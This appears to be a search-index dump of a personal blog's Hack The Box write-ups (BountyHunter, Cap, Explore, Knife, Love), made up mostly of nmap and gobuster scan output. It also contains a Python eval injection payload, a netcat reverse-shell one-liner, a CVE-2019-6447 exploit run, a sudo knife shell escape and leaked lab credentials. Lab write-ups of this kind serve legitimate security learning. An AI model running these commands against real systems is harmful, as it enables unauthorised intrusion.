satisfy if int(ticketCode) % 7 == 4: Payload: 32+110+43+ __import__('os').system('bash') ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/images/bountyhunter.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/bountyhunter/","summary":"BountyHunter Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.11.100 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 15:22 BST Nmap scan report for 10.10.11.100 (10.10.11.100) Host is up (0.18s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","xxe","python-eval","command-injection"],"title":"[HTB] Machine: BountyHunter"},{"categories":null,"contents":"Cap Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.245 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 13:25 BST Nmap scan report for 10.10.10.245 (10.10.10.245) Host is up (0.11s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn |_http-title: Security Dashboard | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Sun, 06 Aug 2023 12:35:52 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//W3C//DTD HTML 3.2 Final//EN\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;404 Not Found\u0026lt;/title\u0026gt; | \u0026lt;h1\u0026gt;Not Found\u0026lt;/h1\u0026gt; | \u0026lt;p\u0026gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.\u0026lt;/p\u0026gt; | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sun, 06 Aug 2023 12:35:46 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 19386 | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html class=\u0026#34;no-js\u0026#34; lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta http-equiv=\u0026#34;x-ua-compatible\u0026#34; content=\u0026#34;ie=edge\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Security Dashboard\u0026lt;/title\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/static/images/icon/favicon.ico\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/bootstrap.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/font-awesome.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/themify-icons.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/metisMenu.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/owl.carousel.min.css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;/static/css/slicknav.min.css\u0026#34;\u0026gt; | \u0026lt;!-- amchar | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Sun, 06 Aug 2023 12:35:46 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: OPTIONS, GET, HEAD | Content-Length: 0 | RTSPRequest: | HTTP/1.1 400 Bad Request | Connection: close | Content-Type: text/html | Content-Length: 196 | \u0026lt;html\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Bad Request\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt; | Invalid HTTP Version \u0026amp;#x27;Invalid HTTP Version: \u0026amp;#x27;RTSP/1.0\u0026amp;#x27;\u0026amp;#x27; | \u0026lt;/body\u0026gt; |_ \u0026lt;/html\u0026gt; |_http-server-header: gunicorn 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.94%I=7%D=8/6%Time=64CF93C4%P=x86_64-pc-linux-gnu%r(GetRe SF:quest,1026,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20S SF:un,\\x2006\\x20Aug\\x202023\\x2012:35:46\\x20GMT\\r\\nConnection:\\x20close\\r\\n SF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x201938 SF:6\\r\\n\\r\\n\u0026lt;!DOCTYPE\\x20html\u0026gt;\\n\u0026lt;html\\x20class=\\\u0026#34;no-js\\\u0026#34;\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\\n SF:\\n\u0026lt;head\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x20charset=\\\u0026#34;utf-8\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20 SF:\u0026lt;meta\\x20http-equiv=\\\u0026#34;x-ua-compatible\\\u0026#34;\\x20content=\\\u0026#34;ie=edge\\\u0026#34;\u0026gt;\\n\\x20\\x SF:20\\x20\\x20\u0026lt;title\u0026gt;Security\\x20Dashboard\u0026lt;/title\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;meta\\x SF:20name=\\\u0026#34;viewport\\\u0026#34;\\x20content=\\\u0026#34;width=device-width,\\x20initial-scale=1 SF:\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;shortcut\\x20icon\\\u0026#34;\\x20type=\\\u0026#34;image/ SF:png\\\u0026#34;\\x20href=\\\u0026#34;/static/images/icon/favicon\\.ico\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;l SF:ink\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/bootstrap\\.min\\.css\\\u0026#34;\u0026gt;\\ SF:n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/font SF:-awesome\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20h SF:ref=\\\u0026#34;/static/css/themify-icons\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\ SF:\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/metisMenu\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20 SF:\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/css/owl\\.carousel\\.min\\.c SF:ss\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;link\\x20rel=\\\u0026#34;stylesheet\\\u0026#34;\\x20href=\\\u0026#34;/static/cs SF:s/slicknav\\.min\\.css\\\u0026#34;\u0026gt;\\n\\x20\\x20\\x20\\x20\u0026lt;!--\\x20amchar\u0026#34;)%r(HTTPOptions SF:,B3,\u0026#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Sun,\\x20 SF:06\\x20Aug\\x202023\\x2012:35:46\\x20GMT\\r\\nConnection:\\x20close\\r\\nContent SF:-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20GET,\\x20 SF:HEAD\\r\\nContent-Length:\\x200\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,121,\u0026#34;HTTP/1\\.1\\x20 SF:400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20text/ SF:html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n\u0026lt;html\u0026gt;\\n\\x20\\x20\u0026lt;head\u0026gt;\\n\\x20\\x20\\ SF:x20\\x20\u0026lt;title\u0026gt;Bad\\x20Request\u0026lt;/title\u0026gt;\\n\\x20\\x20\u0026lt;/head\u0026gt;\\n\\x20\\x20\u0026lt;body\u0026gt;\\n SF:\\x20\\x20\\x20\\x20\u0026lt;h1\u0026gt;\u0026lt;p\u0026gt;Bad\\x20Request\u0026lt;/p\u0026gt;\u0026lt;/h1\u0026gt;\\n\\x20\\x20\\x20\\x20Invalid SF:\\x20HTTP\\x20Version\\x20\u0026amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20\u0026amp;#x27;RTSP/ SF:1\\.0\u0026amp;#x27;\u0026amp;#x27;\\n\\x20\\x20\u0026lt;/body\u0026gt;\\n\u0026lt;/html\u0026gt;\\n\u0026#34;)%r(FourOhFourRequest,189, SF:\u0026#34;HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Su SF:n,\\x2006\\x20Aug\\x202023\\x2012:35:52\\x20GMT\\r\\nConnection:\\x20close\\r\\nC SF:ontent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20232\\r SF:\\n\\r\\n\u0026lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20HTML\\x203\\.2\\x20F SF:inal//EN\\\u0026#34;\u0026gt;\\n\u0026lt;title\u0026gt;404\\x20Not\\x20Found\u0026lt;/title\u0026gt;\\n\u0026lt;h1\u0026gt;Not\\x20Found\u0026lt;/h1\u0026gt;\\ SF:n\u0026lt;p\u0026gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x20serv SF:er\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\x20che SF:ck\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.\u0026lt;/p\u0026gt;\\n\u0026#34;); Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 807.41 seconds gobuster └─$ gobuster dir -u http://10.10.10.245/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.245/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/08/06 14:20:38 Starting gobuster in directory enumeration mode =============================================================== /data (Status: 302) [Size: 208] [--\u0026gt; http://10.10.10.245/] /ip (Status: 200) [Size: 17451] /netstat (Status: 200) [Size: 34051] /capture (Status: 302) [Size: 220] [--\u0026gt; http://10.10.10.245/data/1] Web Server Foothold/User When we visit /capture, we got redirected to /data/1 We can try checking other numbers, where few results in successful pages So we might want to check all possible numbers, since it looks like IDOR If we visit http://10.10.10.245/data/0 and open pcap file with wireshark we see the creds for ftp nathan:Buck3tH4TF0RM3! If we try the creds for ssh, they work Root Linpeas shows that python has cap_setuid,cap_net_bind_service+eip capabilities GTFOBins ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/cap/images/cap.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/cap/","summary":"Cap Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.245 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 13:25 BST Nmap scan report for 10.10.10.245 (10.10.10.245) Host is up (0.11s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn |_http-title: Security Dashboard | fingerprint-strings: | FourOhFourRequest: | HTTP/1.","tags":["HTB","pcap","idor","wireshark","capabilities"],"title":"[HTB] Machine: Cap"},{"categories":null,"contents":"Explore Enumeration nmap └─$ nmap -Pn -p- 10.10.10.247 -T5 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 17:40 BST Warning: 10.10.10.247 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.247 (10.10.10.247) Host is up (0.12s latency). Not shown: 65530 closed ports PORT STATE SERVICE 2222/tcp open EtherNetIP-1 5555/tcp filtered freeciv 42135/tcp open unknown 59777/tcp open unknown └─$ nmap -p2222,38925,42135,59777 -Pn 10.10.10.247 -sC -sV Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 17:32 BST Nmap scan report for 10.10.10.247 (10.10.10.247) Host is up (0.12s latency). PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 42135/tcp open http ES File Explorer Name Response httpd |_http-title: Site doesn\u0026#39;t have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn\u0026#39;t have a title (text/plain). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port2222-TCP:V=7.94%I=7%D=8/6%Time=64CFCB14%P=x86_64-pc-linux-gnu%r(NUL SF:L,24,\u0026#34;SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\u0026#34;); Service Info: Device: phone Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds Foothold/User nmap suggests Minecraft server Googling tells it\u0026rsquo;s ES File Explorer File Manager with CVE-2019-6447 We have a github repo └─$ python3 cve-2019-6447.py list ###################### # Available Commands # ###################### listFiles: List all the files listPics: List all the pictures listVideos: List all the videos listAudios: List all the audio files listApps: List all the apps installed listAppsSystem: List all the system apps listAppsPhone: List all the phone apps listAppsSdcard: List all the apk files in the sdcard listAppsAll: List all the apps installed (system apps included) getDeviceInfo: Get device info. Package name parameter is needed appPull: Pull an app from the device appLaunch: Launch an app. Package name parameter is needed getAppThumbnail: Get the icon of an app. Package name parameter is needed While going through every command we notice creds.jpg file └─$ python3 cve-2019-6447.py --cmd listPics --host 10.10.10.247 [*] Executing command: listPics on 10.10.10.247 [*] Server responded with: 200 {\u0026#34;name\u0026#34;:\u0026#34;concept.jpg\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:38:08 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/concept.jpg\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;135.33 KB (138,573 Bytes)\u0026#34;, }, {\u0026#34;name\u0026#34;:\u0026#34;anc.png\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:37:50 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/anc.png\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;6.24 KB (6,392 Bytes)\u0026#34;, }, {\u0026#34;name\u0026#34;:\u0026#34;creds.jpg\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:38:18 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/creds.jpg\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;1.14 MB (1,200,401 Bytes)\u0026#34;, }, {\u0026#34;name\u0026#34;:\u0026#34;224_anc.png\u0026#34;, \u0026#34;time\u0026#34;:\u0026#34;4/21/21 02:37:21 AM\u0026#34;, \u0026#34;location\u0026#34;:\u0026#34;/storage/emulated/0/DCIM/224_anc.png\u0026#34;, \u0026#34;size\u0026#34;:\u0026#34;124.88 KB (127,876 Bytes)\u0026#34;} Let\u0026rsquo;s download and open it └─$ python3 cve-2019-6447.py --get-file /storage/emulated/0/DCIM/creds.jpg --host 10.10.10.247 [*] Getting file: /storage/emulated/0/DCIM/creds.jpg from: 10.10.10.247 [*] Server responded with: 200 [*] Writing to file: creds.jpg We have creds kristi:Kr1sT!5h@Rp3xPl0r3! Let\u0026rsquo;s ssh If we look for a user.txt, we have nothing find . -name user.txt 2\u0026gt;/dev/null So I spent sometime looking for a flag, until I found it in /storage/emulated/0, where the pictures were stored Root Enumeration shows that now we have previously filtered port 5555 :/storage/emulated/0 $ netstat -tulpn Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program Name tcp6 0 0 :::2222 :::* LISTEN 4748/net.xnano.android.sshserver tcp6 0 0 :::5555 :::* LISTEN - tcp6 0 0 :::42135 :::* LISTEN - tcp6 0 0 ::ffff:10.10.10.2:35737 :::* LISTEN - tcp6 0 0 ::ffff:127.0.0.1:41985 :::* LISTEN - tcp6 0 0 :::59777 :::* LISTEN - udp 0 0 10.10.10.247:13022 1.0.0.1:53 ESTABLISHED - udp 0 0 10.10.10.247:30449 1.1.1.1:53 ESTABLISHED - udp 0 0 10.10.10.247:19481 1.0.0.1:53 ESTABLISHED - udp 0 0 10.10.10.247:7334 1.1.1.1:53 ESTABLISHED - udp 0 0 0.0.0.0:5353 0.0.0.0:* - udp 0 0 0.0.0.0:56977 0.0.0.0:* - udp6 0 0 :::1900 :::* - udp6 0 0 :::5353 :::* - udp6 0 0 :::5353 :::* - udp6 0 0 :::5353 :::* - udp6 0 0 ::ffff:10.10.10.2:51524 :::* - udp6 0 0 :::46781 :::* - So let\u0026rsquo;s use port forwarding └─$ ssh -L 5555:localhost:5555 kristi@10.10.10.247 -p 2222 Password authentication (kristi@10.10.10.247) Password: :/ $ I installed adb to interact with android devices Now we can access the device If we check the user, we are still lov-priveleged one Trying su gave me root ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/explore/images/explore.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/explore/","summary":"Explore Enumeration nmap └─$ nmap -Pn -p- 10.10.10.247 -T5 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 17:40 BST Warning: 10.10.10.247 giving up on port because retransmission cap hit (2). Nmap scan report for 10.10.10.247 (10.10.10.247) Host is up (0.12s latency). Not shown: 65530 closed ports PORT STATE SERVICE 2222/tcp open EtherNetIP-1 5555/tcp filtered freeciv 42135/tcp open unknown 59777/tcp open unknown └─$ nmap -p2222,38925,42135,59777 -Pn 10.10.10.247 -sC -sV Starting Nmap 7.","tags":["HTB","android","adb","es-file-explorer","cve-2019-6447","tunnel"],"title":"[HTB] Machine: Explore"},{"categories":null,"contents":"Knife Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.242 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 12:29 BST Nmap scan report for 10.10.10.242 (10.10.10.242) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA) |_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Emergent Medical Idea |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 43.41 seconds gobuster └─$ gobuster dir -u http://10.10.10.242/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.242/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,txt [+] Timeout: 10s =============================================================== 2023/08/06 12:31:56 Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 5815] Web server Foothold/User We server\u0026rsquo;s backend X-Powered-By: PHP/8.1.0-dev Google reveals RCE in User-Agentt Let\u0026rsquo;s get reverse shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.2 7777 \u0026gt;/tmp/f Root james has sudo rights It\u0026rsquo;s a knife cmd tool from Chef james@knife:/$ /usr/bin/knife -h Chef Infra Client: 16.10.8 Docs: https://docs.chef.io/workstation/knife/ Patents: https://www.chef.io/patents Usage: knife sub-command (options) -s, --server-url URL Chef Infra Server URL. --chef-zero-host HOST Host to start Chef Infra Zero on. --chef-zero-port PORT Port (or port range) to start Chef Infra Zero on. Port ranges like 1000,1010 or 8889-9999 will try all given ports until one works. -k, --key KEY Chef Infra Server API client key. --[no-]color Use colored output, defaults to enabled. -c, --config CONFIG The configuration file to use. --config-option OPTION=VALUE Override a single configuration option. --defaults Accept default values for all questions. -d, --disable-editing Do not open EDITOR, just accept the data as is. -e, --editor EDITOR Set the editor to use for interactive commands. -E, --environment ENVIRONMENT Set the Chef Infra Client environment (except for in searches, where this will be flagrantly ignored). --[no-]fips Enable FIPS mode. -F, --format FORMAT Which format to use for output. (valid options: \u0026#39;summary\u0026#39;, \u0026#39;text\u0026#39;, \u0026#39;json\u0026#39;, \u0026#39;yaml\u0026#39;, or \u0026#39;pp\u0026#39;) --[no-]listen Whether a local mode (-z) server binds to a port. -z, --local-mode Point knife commands at local repository instead of Chef Infra Server. -u, --user USER Chef Infra Server API client username. --print-after Show the data after a destructive operation. --profile PROFILE The credentials profile to select. -V, --verbose More verbose output. Use twice (-VV) for additional verbosity and three times (-VVV) for maximum verbosity. -v, --version Show Chef Infra Client version. -y, --yes Say yes to all prompts for confirmation. -h, --help Show this help message. Available subcommands: (for details, knife SUB-COMMAND --help) Check GTFOBins sudo knife exec -E 'exec \u0026quot;/bin/sh\u0026quot;' ","date":"August 5, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/knife/images/knife.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/knife/","summary":"Knife Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.242 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-06 12:29 BST Nmap scan report for 10.10.10.242 (10.10.10.242) Host is up (0.17s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA) | 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA) |_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB","php-backdoor","php-8.1.0-dev","sudo","knife","gtfobins"],"title":"[HTB] Machine: Knife"},{"categories":null,"contents":"Love Enumeration nmap └─$ nmap -sC -sV -Pn 10.10.10.239 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-08 16:58 BST Nmap scan report for 10.10.10.239 (10.10.10.239) Host is up (0.19s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) |_http-title: Voting System using PHP | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in | Not valid before: 2021-01-18T14:00:16 |_Not valid after: 2022-01-18T14:00:16 |_http-title: 403 Forbidden |_ssl-date: TLS randomness does not represent time 445/tcp open �d��eU Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP) 3306/tcp open mysql? | fingerprint-strings: | LDAPBindReq, NCP, NULL, SSLSessionReq: |_ Host \u0026#39;10.10.16.3\u0026#39; is not allowed to connect to this MariaDB server 5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27) |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 |_http-title: 403 Forbidden 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3306-TCP:V=7.94%I=7%D=8/8%Time=64D26648%P=x86_64-pc-linux-gnu%r(NUL SF:L,49,\u0026#34;E\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.3\u0026#39;\\x20is\\x20not\\x20allowed SF:\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(SSLSessionReq, SF:49,\u0026#34;E\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.3\u0026#39;\\x20is\\x20not\\x20allowed\\x SF:20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(LDAPBindReq,49,\u0026#34; SF:E\\0\\0\\x01\\xffj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.3\u0026#39;\\x20is\\x20not\\x20allowed\\x20to SF:\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\u0026#34;)%r(NCP,49,\u0026#34;E\\0\\0\\x01\\xf SF:fj\\x04Host\\x20\u0026#39;10\\.10\\.16\\.3\u0026#39;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\ SF:x20to\\x20this\\x20MariaDB\\x20server\u0026#34;); Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_clock-skew: mean: 2h41m00s, deviation: 4h02m31s, median: 20m59s | smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3) | OS CPE: cpe:/o:microsoft:windows_10::- | Computer name: Love | NetBIOS computer name: LOVE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2023-08-08T09:20:21-07:00 | smb2-time: | date: 2023-08-08T16:20:22 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 50.44 seconds smb └─$ smbmap -H 10.10.10.239 -R -u \u0026#39;\u0026#39; [!] Authentication error on 10.10.10.239 We saw that ports 443 and 5000 are 403 Forbidden Let\u0026rsquo;s check port 80 gobuster └─$ gobuster dir -u http://10.10.10.239/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,txt =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.239/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 